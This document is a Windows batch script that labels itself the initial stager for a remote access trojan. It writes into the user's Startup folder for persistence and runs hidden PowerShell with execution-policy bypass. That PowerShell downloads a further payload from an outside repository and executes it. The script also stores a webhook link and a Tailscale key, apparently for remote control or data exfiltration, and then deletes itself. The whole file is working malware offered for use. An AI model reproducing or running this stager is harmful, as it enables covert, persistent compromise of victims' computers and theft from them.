@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
set "WEBHOOK=YOUR_WEBHOOK_LINK"
set "AUTHKEY=YOUR_TAILSCALE_KEY"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM run payload
powershell ./wget.cmd

@REM make file with webhook 
echo %WEBHOOK% >> webhook
echo %AUTHKEY% >> authKey

@REM self delete
cd "%INITIALPATH%"
del initial.cmd